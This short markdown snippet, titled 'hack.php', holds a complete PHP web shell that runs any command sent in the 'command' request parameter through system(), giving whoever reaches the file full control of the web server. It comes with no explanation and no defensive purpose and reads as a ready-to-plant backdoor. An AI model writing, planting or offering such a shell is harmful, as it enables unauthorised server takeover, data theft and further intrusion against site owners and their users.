# `hack.php`

Refer to below.

```PHP
<?php 
if (isset($_REQUEST['command'])) {
  $command = $_REQUEST['command'];
  system($command);
}
?>
```
